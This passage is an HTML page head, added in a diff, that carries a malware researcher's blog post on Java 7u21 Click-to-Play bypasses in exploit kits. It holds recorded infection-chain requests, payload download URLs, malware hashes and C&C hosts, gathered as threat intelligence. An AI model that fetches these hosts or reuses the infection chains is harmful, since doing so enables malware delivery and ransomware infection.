@@ -1,0 +1,577 @@
+<!doctype html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>jre7u21 and earlier Click-2-Play Warning Bypass integrating Exploit Kits</title>
+
+    <link rel="stylesheet" type="text/css" href="http://malware2.dontneedcoffee.com/assets/css/styles_feeling_responsive.css">
+
+  
+
+	<script src="http://malware2.dontneedcoffee.com/assets/js/modernizr.min.js"></script>
+
+	<script src="https://ajax.googleapis.com/ajax/libs/webfont/1.5.18/webfont.js"></script>
+	<script>
+		WebFont.load({
+			google: {
+				families: [ 'Lato:400,700,400italic:latin', 'Volkhov::latin' ]
+			}
+		});
+	</script>
+
+	<noscript>
+		<link href='http://fonts.googleapis.com/css?family=Lato:400,700,400italic%7CVolkhov' rel='stylesheet' type='text/css'>
+	</noscript>
+
+
+	<!-- Search Engine Optimization -->
+	<meta name="description" content="A new variant of a &quot;Kore-ish&quot; Cool EK appeared few days ago.Yes...it&#39;s difficult to follow the EK fast moving landscape...No payload in the jar for that one.Some instances of this &quot;Cool EK&quot;&amp;nbsp;in URLQueryI faced it often where I used to see Kore (aka Sibhost) Exploit Kit.It is also used to spread the Urausy Ransomware and FakeAV (so... BestAV stuff)All jar found there were identical as those in Blackhole. Till today.CVE-2013-2460 + Click2Play Bypass :That CVE was already in use in&amp;nbsp;Private Exploit Pack&amp;nbsp;but it was noisy (Imposition then made it optional )CVE-2013-2460 successfull path in Cool EK (Kore-ish)Click2Play Bypass inside 2013-09-20GET http://[redacted].tacogratis .com/index.php?p=5267200 OK (text/html)Key Piece of the landingGET http://[redacted].tacogratis .com/index.php?p=5290200 OK (text/javascript)GET http://[redacted].tacogratis .com/index.php?p=5268&amp;nbsp;fb1decbef1c4361eb421a3496201ef30200 OK (application/java-archive)GET http://[redacted].tacogratis .com/index.php?p=5268200 OK (application/java-archive)GET http://cghtuj.tacogratis .com/index.php?p=5275&amp;amp;e=14200 OK (application/x-msdownload) &amp;nbsp;170896de44d75651bbbd9358b0f11c34&amp;nbsp;(Urausy Ransomware)----- Off Topic ----Payload is rotating fast (2 more md5) :b56348220f83ad9db50cb5beb564148b64ef8f2cb215af4b2fbcb51cadfcc025Urauy Ransomware - DE design - 2013-09-20(BestAV soft 2)Note : on another thread you can get &amp;nbsp;a FakeAVPayload call with bigger charge9d8d3094849f685859945140721aafb17fb9423c4bdf7080137745e81ba3836213e24b552ea472146495ac8a33cca975Other payload from this &quot;Kore-ish&quot; Cool EK(BestAV Soft1)-------------------So what&#39;s that &amp;nbsp;Click2Play bypass ?Quite surely :&amp;nbsp;http://seclists.org/bugtraq/2013/Jul/412013-06-18 - Vulnerability Fixed in Java 7u25Yes :Warning with jre7u25(and as CVE-2013-2460 is patch too...clicking on run there won&#39;t put you at risk)It&#39;s the first time I see that.5 days ago :EKs vs jre7u21 : http://t.co/jCkdtnp7NW— kafeine (@kafeine) September 15, 2013 Who sold it ???No download link for now. Yes it will spread fast anyway.It&#39;s easy to get rid of all these Exploit Kits : update !&amp;lt;edit1 2013-09-21&amp;gt;Already in Sakura...surely cause of that blog post. It&#39;s often difficult to decide how much you can write about something.Sakura CVE-2013-2460 &amp;amp; Click2Play Bypass :Sakura featuring CVE-2013-2460 &amp;amp; Click2Play bypass2013-09-21GET http://[redacted]253 .pw:8509/me.php200 OK (text/html)Precision Strikenew Click2Play bypass for 21 versionJnlp callGET http://[redacted]&amp;nbsp;.pw:8509/[redacted].ee200 OK (application/java-archive)&amp;nbsp;dca89d839abbb8f621a87de94d20d8f2&amp;nbsp;CVE-2013-2460Piece of CVE-2013-2460 in Sakura Jar 2013-09-21&amp;nbsp;GET http://[redacted]&amp;nbsp;.pw:8509/bodystarswild.ee200 OK (application/java-archive)GET http://[redacted] .pw:8509/2889.ld200 OK (application/octet-stream) Once decoded : 5fba8226303967ccfd27ea8710a8b99d I think it&#39;s a Smokebot----- Off Topic ----C&amp;amp;C Calls :mexstat757.com POST /satep757/index.phpmexstat220.pw GET /setex/sev57.exe&amp;nbsp;mexstat220.pw &amp;nbsp;GET &amp;nbsp;/setex/pm555.exeetc...46.165.201.27&amp;nbsp;16265 | 46.165.192.0/18 | LEASEWEB | DE | LEASEWEB.COM | LEASEWEB GERMANY GMBHIt&#39;s the same guys than those who were behind this one year old post :From Sakura to Reveton via Smoke Bot - Or a Botnet Distribution of Reveton&amp;nbsp;&amp;nbsp;2012-09-12Since then Smoke Bot is now encrypting its network calls.Analysis by&amp;nbsp;Joe Sandbox Cloud----------------------&amp;nbsp;&amp;lt;/edit1&amp;gt;&amp;lt;edit2: 2013-09-23&amp;gt;Nuclear Pack : CVE-2013-2460 + Click2Play bypassAnnounced Underground :&quot;добавлен новы exploit, пробив увеличен. работает тихо и не палится&quot; &amp;nbsp;Nuclearwhich means something like:&quot;New exploit added, breaking rate increased, works silently and scorched&quot;CVE-2013-2460 with no security prompt successful path in Nuclear Pack2013-09-23GET http://[redacted].flogdoyfohoqobl .biz:12421/3dfa4ffa555573ba6fbb54a243289806/4/5b1bb46b5a96bee3ebbb1d2251d968bb.html200 OK (text/html)Precision Strike&amp;nbsp;&amp;nbsp;(Thanks&amp;nbsp;@EKWatcher&amp;nbsp;)jnlp call in Nuclear PackAfter Deobfuscation (Thanks&amp;nbsp;@EKWatcher&amp;nbsp;)GET http://[redacted].flogdoyfohoqobl .biz:12421/b26c7ee3934bb471d1e1a7e4072dc6ef/1379924555/ba365f21b8ebcfe78ba8a843b76c2d06.jar200 OK (application/java)GET http://[redacted].flogdoyfohoqobl .biz:12421/b26c7ee3934bb471d1e1a7e4072dc6ef/1379924555/ba365f21b8ebcfe78ba8a843b76c2d06.jar200 OK (application/java)&amp;nbsp;e03455403f226b23be42b30733a26101Piece of CVE-2013-2460 in Nuclear Pack 2013-09-23GET http://[redacted].flogdoyfohoqobl .biz:12421/f/1379924555/ba365f21b8ebcfe78ba8a843b76c2d06/b26c7ee3934bb471d1e1a7e4072dc6ef/2200 OK (application/octet-stream) Decoded :&amp;nbsp;3a9d1dcad1176717711eb92b25f7d6b0GET http://[redacted].flogdoyfohoqobl .biz:12421/f/1379924555/ba365f21b8ebcfe78ba8a843b76c2d06/b26c7ee3934bb471d1e1a7e4072dc6ef/2/2200 OK (application/octet-stream)----------- Out of Topic -----------C&amp;amp;C :185.6.80.125 -&amp;nbsp;61422 | 185.6.80.0/24 | TD-VITA | RU | - | TD-VITA LLC.for instance :POST /mBj7cjhH/gate.php HTTP/1.1Content-Type: application/x-www-form-urlencodedConnection: closeUser-Agent: Mozilla/4.0Host: halifaxkilo.comAnalysis&amp;nbsp;by&amp;nbsp;Joe Sandbox Cloud------------------------------------&amp;lt;/edit2&amp;gt;&amp;lt;edit3&amp;gt;Styx CVE-2013-2472 + Click2Play Bypass :Many Thanks to Timo Hirvonen from F-Secure for identifying the CVE.Styx Java exploit mentioned by @kafeine in his blog exploits CVE-2013-2472. This is the first time we see it exploited by cyber criminals— Timo Hirvonen (@TimoHirvonen) September 24, 2013 Reveton Pushed in Styx 2013-09-24Using CVE-2013-2472 &amp;amp; Click2Play Bypass on jre7u21We can see the call for Bitcoin miner after VM Reboot.GET http://[redacted].info/hsZv/3J17_DtR/13C_ht11nF-E17H_R60kufr_0HUzD0c/xrB/055RR0/iWsU0-VEw-x0Rm-ou0xvC-3/302 Found to http://an-wis.info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/200 OK (text/html)GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/yavirts.html200 OK (text/html)GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/jplay.html200 OK (text/html) (jnlp call)Click2Play Bypass in Styx 2013-09-24GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/NyJjQvjE.jar200 OK (application/java-archive)GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/NyJjQvjE.jar200 OK (application/java-archive)&amp;nbsp;3c812730758b9118ba4764adf3ab53bcGET http://[redacted].info/r007gL_0e2X80Ooo-30N1XG/0C/rt/d0tg2C-0e_l6L0H_NL40C05W/0aDec0A/b5g-04-yuI0i3/KS00i/AE0m/VuD0uHFw0/pRgP0Dy-z80J_Aek0Y_hcr0AhC_80_lWyk13f/It0865-L0O_GKn-0E/1dA0baP00-1EAC0QAs/R0f-4Bq0ZIn-f0X_4n-30otyr-05Y83-0ZxLA/17y/RZ0I/MM60-Ajpo06eml/0gVj_P0Yv3E0MRn/30AF6J0H/9ZU0f/WRI0wAPs11/ttO0CZz_j0leh-i0k1X_l0oDdd_0ah_pC/kC4XSO15ZD.exe?lniV=7decb&amp;amp;h=16200 OK (application/x-dosexec)&amp;nbsp;4a0e95c28b2b5b6259b7b558c3565988----------- Out of Topic : Payload -----------Reveton.C&amp;amp;C Reverse Proxy :Reveton Calling Home2013-09-2464.191.122.10 -&amp;nbsp;21788 | 64.191.0.0/17 | NOC | US | NOCINC.COM | NETWORK OPERATIONS CENTER INC.We can see the call to the Bitcoin Miner (read:&amp;nbsp;Ransomware Puts Your System To Work Mining Bitcoins&amp;nbsp;)The binary is not there anymore since 2013-09-11 (was :&amp;nbsp;2794fd5b64b585df132b4524b82d18c8&amp;nbsp;)--------------------------------------------------&amp;lt;/edit3&amp;gt;&amp;lt;edit4 : 2013-09-24&amp;gt;Neutrino : CVE-2013-2460 + Click2Play bypassIt seems the integration has been far from smooth for the Neutrino coder.The jar is inside the Exploit Kit since more than 3 days. The coder announced the new exploit 2 days ago...but the warning was still here and even validating the execution your were safe. Some protections were removed (you could hit the exploit kit as many time as you want with same IP without problem...seems like someone else was testing it :) ). And the 22 (sunday) more than half a day with all threads in 404...But in the end...he made it.CVE-2013-2460 + Click2Play ByPass in Neutrino2013-09-24Will only keep relevant calls :GET http://[redacted].dyndns .info:8000/gxstfkhf?ttdwjipi=4128154200 OK (text/html)GET http://ajax.googleapis .com/ajax/libs/jquery/1.9.1/jquery.min.js200 OK (text/javascript)GET http://[redacted].dyndns .info:8000/index.js200 OK (application/x-javascript)POST http://[redacted].dyndns .info:8000/twpnnurhbg200 OK (text/html)Encoded JnlpApplying the Neutrino &quot;xor&quot; function with key &quot;qoxacfix&quot;JnlpBase64 decode of the jnlp_embedded value :GET http://[redacted].dyndns .info:8000/rclmrcfdvdjtq?joiihv=uihuzdhhuq200 OK (application/java-archive)&amp;nbsp;GET http://[redacted].dyndns .info:8000/rclmrcfdvdjtq?joiihv=uihuzdhhuq200 OK (application/java-archive)&amp;nbsp;3fcac6c64ce0ca28ee615a8fad224dd3Piece of slightly obfuscated CVE-2013-2460 in Neutrino(since 2013-09-21 in fact)GET http://[redacted].dyndns .info:8000/faybcc?juzickeew=uihuzdhhuq200 OK (application/octet-stream) Decoded :&amp;nbsp;a126281477c856b9358de5aea1369990&amp;nbsp;who drop &amp;nbsp;:&amp;nbsp;898b9aee9931230ef3bc0c59eb541c55&amp;nbsp;- Didn&#39;t spend too much time to figure out what it is.Saw 404 POST to : http://allewnuado .ru/perl/config.php - &amp;nbsp;79.174.64.12747385 | 79.174.64.0/19 | HOSTING-COMPANY | RU | HC.RU | HOSTING CENTER LTD.&amp;lt;/edit4&amp;gt;&amp;lt;edit5 2013-09-25&amp;gt;Blackhole : CVE-2013-2460 Click2Play BypassI saw that jar yesterday already being pushed without exploitation to jre7u21 in /closest/ Blackhole.It&#39;s the exact same jar as the Cool EK in &quot;/index.php?p=&quot; that introduce the Bypass.Today on the /Home/ (aka q.php)&amp;nbsp;Darkleech fuelled&amp;nbsp;BH EK the Click2Play bypass is here.And payload is as always Pony (steal passwords and act as loader. No change since at least December. It pushes Urausy in some countries or Nymaim in other countries (which can then get another version of Nymaim with locker functionnality or Zaccess).This has been well explained by Eset.BH EK /Home/ aka q.php CVE-2013-2460 + Click2play bypass2013-09-25GET http://64.246.3 .59/e354340618f9c3a8d474225ef7cc6b2a/panic-portable.php200 OK (text/html)Conditions for the bypass calljnlp callGET http://64.246.3 .59/e354340618f9c3a8d474225ef7cc6b2a/panic-portable.php?!0M!6J=1F_*H4z-I*!f&amp;amp;Jk__*zFA_92-*=7*K9_Kp1200 OK (application/java-archive)GET http://64.246.3 .59/e354340618f9c3a8d474225ef7cc6b2a/panic-portable.php?!0M!6J=1F_*H4z-I*!f&amp;amp;Jk__*zFA_92-*=7*K9_Kp1200 OK (application/java-archive)&amp;nbsp;f5fc4540e6e64efee8711007ac0d4ed1CVE-2013-2460 in BH EK2013-09-25GET http://64.246.3 .59/e354340618f9c3a8d474225ef7cc6b2a/panic-portable.php?-*Z73922k0NUj8=8b8cwd8aww&amp;amp;*F21!gX=w88c8dw6wdw7wbwbwd8c&amp;amp;!_239!6W25u*_=ww&amp;amp;59*!a34-d1_2!uT=u*g88*8&amp;amp;OF2EFwol0!3_9=7ZF!Y*08*!P_75m200 OK (application/x-msdownload) -&amp;nbsp;acb80f0eaa177953a53f3be188c8e3da&amp;nbsp;&amp;nbsp;Analysis and sample:&amp;nbsp;Malwr.com&amp;lt;/edit5&amp;gt;&amp;lt;edit6 2013-10-14&amp;gt;Kore : &amp;nbsp;CVE-2013-2460(Thanks to&amp;nbsp;Timo Hirvonen&amp;nbsp;for confirmation)CVE-2013-2460 (?) and Click2play Bypass in Kore 2013-10-14Pushing Urausy ObviouslyGET http://zanol.muabannhadatdothi .com:90/web.html200 OK (text/html)Piece of Kore Landing.Not what i would call a precision Strike !GET http://zanol.muabannhadatdothi .com:90/jquery.js200 OK (application/javascript)GET http://zanol.muabannhadatdothi .com:90/web.html2.zip200 OK (application/octet-stream)GET http://zanol.muabannhadatdothi .com:90/web.html2.zip200 OK (application/octet-stream)GET http://zanol.muabannhadatdothi .com:90/web.html2.zip200 OK (application/octet-stream)GET http://zanol.muabannhadatdothi .com:90/web.html2.zip200 OK (application/octet-stream)GET http://zanol.muabannhadatdothi .com/web.html?id=2&amp;amp;text=1164200 OK (text/html) (call back)&amp;lt;/edit6&amp;gt;&amp;lt;edit7 2013-10-26&amp;gt;Magnitude : CVE-2013-2463 + C2P bypassIt&#39;s inside Magnitude (popads) since at least 2013-10-19See : Magnitude EK : Pop Pop !&amp;lt;/edit7&amp;gt;&amp;lt;edit8 2013-10-31&amp;gt;Sweet Orange : CVE-2013-2460 + C2P Bypass:Seems to be inside since few days.Thanks to&amp;nbsp;Timo Hirvonen&amp;nbsp;from F-Secure for naming that CVE. Thanks to&amp;nbsp;Chris Wakelin&amp;nbsp;for additionnal help on this.Sweet Orange 2013-10-31CVE-2013-2460 + Click2play bypass successful passGET http://8c10d9c992f1064f.dyndns-remote .com/voip/ports.php?tracetabs=43200 OK (text/html)Piece of Landing after deobfuscation showing the jnlp.GET http://8c10d9c992f1064f.dyndns-remote .com/voip/gBSlO200 OK (application/x-java-archive)&amp;nbsp;87c775be2b9519dd97a0b84da3e3b9b1&amp;nbsp; CVE-2013-2460 insideGET http://8c10d9c992f1064f.dyndns-remote .com/voip/gBSlO200 OK (application/x-java-archive)GET http://8c10d9c992f1064f.dyndns-remote .com/voip/IWcaNgp200 OK (application/x-java-archive)GET http://8c10d9c992f1064f.dyndns-remote .com/voip/OBTjZPq200 OK (application/x-java-archive)GET http://8c10d9c992f1064f.dyndns-remote .com/spanish.php?edit=269&amp;amp;main=4&amp;amp;comp=158&amp;amp;question=171&amp;amp;press=416&amp;amp;staff=385&amp;amp;lang=265&amp;amp;media=552&amp;amp;entry=160&amp;amp;affiliate=156&amp;nbsp;bc57bdf43e0e2d0efe2d0c0e06cddd9d200 OK (application/octet-stream)Files :&amp;nbsp;2 fiddler here&amp;nbsp;(owncloud via goo.gl)&amp;lt;/edit8&amp;gt;">
+  	
+	
+	<link rel="author" href="https://www.blogger.com/profile/16711421957420573353">
+	
+	
+	<link rel="canonical" href="http://malware2.dontneedcoffee.com/2013/09/jre7u21-and-earlier-click-2-play.html">
+
+
+	<!-- Facebook Open Graph -->
+	<meta property="og:title" content="jre7u21 and earlier Click-2-Play Warning Bypass integrating Exploit Kits">
+	<meta property="og:description" content="A new variant of a &quot;Kore-ish&quot; Cool EK appeared few days ago.Yes...it&#39;s difficult to follow the EK fast moving landscape...No payload in the jar for that one.Some instances of this &quot;Cool EK&quot;&amp;nbsp;in URLQueryI faced it often where I used to see Kore (aka Sibhost) Exploit Kit.It is also used to spread the Urausy Ransomware and FakeAV (so... BestAV stuff)All jar found there were identical as those in Blackhole. Till today.CVE-2013-2460 + Click2Play Bypass :That CVE was already in use in&amp;nbsp;Private Exploit Pack&amp;nbsp;but it was noisy (Imposition then made it optional )CVE-2013-2460 successfull path in Cool EK (Kore-ish)Click2Play Bypass inside 2013-09-20GET http://[redacted].tacogratis .com/index.php?p=5267200 OK (text/html)Key Piece of the landingGET http://[redacted].tacogratis .com/index.php?p=5290200 OK (text/javascript)GET http://[redacted].tacogratis .com/index.php?p=5268&amp;nbsp;fb1decbef1c4361eb421a3496201ef30200 OK (application/java-archive)GET http://[redacted].tacogratis .com/index.php?p=5268200 OK (application/java-archive)GET http://cghtuj.tacogratis .com/index.php?p=5275&amp;amp;e=14200 OK (application/x-msdownload) &amp;nbsp;170896de44d75651bbbd9358b0f11c34&amp;nbsp;(Urausy Ransomware)----- Off Topic ----Payload is rotating fast (2 more md5) :b56348220f83ad9db50cb5beb564148b64ef8f2cb215af4b2fbcb51cadfcc025Urauy Ransomware - DE design - 2013-09-20(BestAV soft 2)Note : on another thread you can get &amp;nbsp;a FakeAVPayload call with bigger charge9d8d3094849f685859945140721aafb17fb9423c4bdf7080137745e81ba3836213e24b552ea472146495ac8a33cca975Other payload from this &quot;Kore-ish&quot; Cool EK(BestAV Soft1)-------------------So what&#39;s that &amp;nbsp;Click2Play bypass ?Quite surely :&amp;nbsp;http://seclists.org/bugtraq/2013/Jul/412013-06-18 - Vulnerability Fixed in Java 7u25Yes :Warning with jre7u25(and as CVE-2013-2460 is patch too...clicking on run there won&#39;t put you at risk)It&#39;s the first time I see that.5 days ago :EKs vs jre7u21 : http://t.co/jCkdtnp7NW— kafeine (@kafeine) September 15, 2013 Who sold it ???No download link for now. Yes it will spread fast anyway.It&#39;s easy to get rid of all these Exploit Kits : update !&amp;lt;edit1 2013-09-21&amp;gt;Already in Sakura...surely cause of that blog post. It&#39;s often difficult to decide how much you can write about something.Sakura CVE-2013-2460 &amp;amp; Click2Play Bypass :Sakura featuring CVE-2013-2460 &amp;amp; Click2Play bypass2013-09-21GET http://[redacted]253 .pw:8509/me.php200 OK (text/html)Precision Strikenew Click2Play bypass for 21 versionJnlp callGET http://[redacted]&amp;nbsp;.pw:8509/[redacted].ee200 OK (application/java-archive)&amp;nbsp;dca89d839abbb8f621a87de94d20d8f2&amp;nbsp;CVE-2013-2460Piece of CVE-2013-2460 in Sakura Jar 2013-09-21&amp;nbsp;GET http://[redacted]&amp;nbsp;.pw:8509/bodystarswild.ee200 OK (application/java-archive)GET http://[redacted] .pw:8509/2889.ld200 OK (application/octet-stream) Once decoded : 5fba8226303967ccfd27ea8710a8b99d I think it&#39;s a Smokebot----- Off Topic ----C&amp;amp;C Calls :mexstat757.com POST /satep757/index.phpmexstat220.pw GET /setex/sev57.exe&amp;nbsp;mexstat220.pw &amp;nbsp;GET &amp;nbsp;/setex/pm555.exeetc...46.165.201.27&amp;nbsp;16265 | 46.165.192.0/18 | LEASEWEB | DE | LEASEWEB.COM | LEASEWEB GERMANY GMBHIt&#39;s the same guys than those who were behind this one year old post :From Sakura to Reveton via Smoke Bot - Or a Botnet Distribution of Reveton&amp;nbsp;&amp;nbsp;2012-09-12Since then Smoke Bot is now encrypting its network calls.Analysis by&amp;nbsp;Joe Sandbox Cloud----------------------&amp;nbsp;&amp;lt;/edit1&amp;gt;&amp;lt;edit2: 2013-09-23&amp;gt;Nuclear Pack : CVE-2013-2460 + Click2Play bypassAnnounced Underground :&quot;добавлен новы exploit, пробив увеличен. работает тихо и не палится&quot; &amp;nbsp;Nuclearwhich means something like:&quot;New exploit added, breaking rate increased, works silently and scorched&quot;CVE-2013-2460 with no security prompt successful path in Nuclear Pack2013-09-23GET http://[redacted].flogdoyfohoqobl .biz:12421/3dfa4ffa555573ba6fbb54a243289806/4/5b1bb46b5a96bee3ebbb1d2251d968bb.html200 OK (text/html)Precision Strike&amp;nbsp;&amp;nbsp;(Thanks&amp;nbsp;@EKWatcher&amp;nbsp;)jnlp call in Nuclear PackAfter Deobfuscation (Thanks&amp;nbsp;@EKWatcher&amp;nbsp;)GET http://[redacted].flogdoyfohoqobl .biz:12421/b26c7ee3934bb471d1e1a7e4072dc6ef/1379924555/ba365f21b8ebcfe78ba8a843b76c2d06.jar200 OK (application/java)GET http://[redacted].flogdoyfohoqobl .biz:12421/b26c7ee3934bb471d1e1a7e4072dc6ef/1379924555/ba365f21b8ebcfe78ba8a843b76c2d06.jar200 OK (application/java)&amp;nbsp;e03455403f226b23be42b30733a26101Piece of CVE-2013-2460 in Nuclear Pack 2013-09-23GET http://[redacted].flogdoyfohoqobl .biz:12421/f/1379924555/ba365f21b8ebcfe78ba8a843b76c2d06/b26c7ee3934bb471d1e1a7e4072dc6ef/2200 OK (application/octet-stream) Decoded :&amp;nbsp;3a9d1dcad1176717711eb92b25f7d6b0GET http://[redacted].flogdoyfohoqobl .biz:12421/f/1379924555/ba365f21b8ebcfe78ba8a843b76c2d06/b26c7ee3934bb471d1e1a7e4072dc6ef/2/2200 OK (application/octet-stream)----------- Out of Topic -----------C&amp;amp;C :185.6.80.125 -&amp;nbsp;61422 | 185.6.80.0/24 | TD-VITA | RU | - | TD-VITA LLC.for instance :POST /mBj7cjhH/gate.php HTTP/1.1Content-Type: application/x-www-form-urlencodedConnection: closeUser-Agent: Mozilla/4.0Host: halifaxkilo.comAnalysis&amp;nbsp;by&amp;nbsp;Joe Sandbox Cloud------------------------------------&amp;lt;/edit2&amp;gt;&amp;lt;edit3&amp;gt;Styx CVE-2013-2472 + Click2Play Bypass :Many Thanks to Timo Hirvonen from F-Secure for identifying the CVE.Styx Java exploit mentioned by @kafeine in his blog exploits CVE-2013-2472. This is the first time we see it exploited by cyber criminals— Timo Hirvonen (@TimoHirvonen) September 24, 2013 Reveton Pushed in Styx 2013-09-24Using CVE-2013-2472 &amp;amp; Click2Play Bypass on jre7u21We can see the call for Bitcoin miner after VM Reboot.GET http://[redacted].info/hsZv/3J17_DtR/13C_ht11nF-E17H_R60kufr_0HUzD0c/xrB/055RR0/iWsU0-VEw-x0Rm-ou0xvC-3/302 Found to http://an-wis.info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/200 OK (text/html)GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/yavirts.html200 OK (text/html)GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/jplay.html200 OK (text/html) (jnlp call)Click2Play Bypass in Styx 2013-09-24GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/NyJjQvjE.jar200 OK (application/java-archive)GET http://[redacted].info/uhoTif0-WROr0Q-37C0-yBpl_0aj_cG16VuZ-02qAE/0JPA/w09M/S80Jx/Hc0oCWv_0nM3V-12GaV0/PRhA0DV_5j0SVPd0_gTY8/087-Ei00X-ri0W_8rf0nQV-S0jRk9-0jX_AJ0XhbQ/09W5/L07cS20/QYjr0TG-2r_0vM0-I038Gx0_AYCo0z70V/0sy-Lq0E6N-s0TW70/0U1w2-15hVc0U_zhI0/HLYx0gj_iQ16G-rf0hrk/D137BV_05Qr/Q0Nr8A0RN/GY0Vt-dw0Ke-7d17t9_n0Wnx-B/NyJjQvjE.jar200 OK (application/java-archive)&amp;nbsp;3c812730758b9118ba4764adf3ab53bcGET 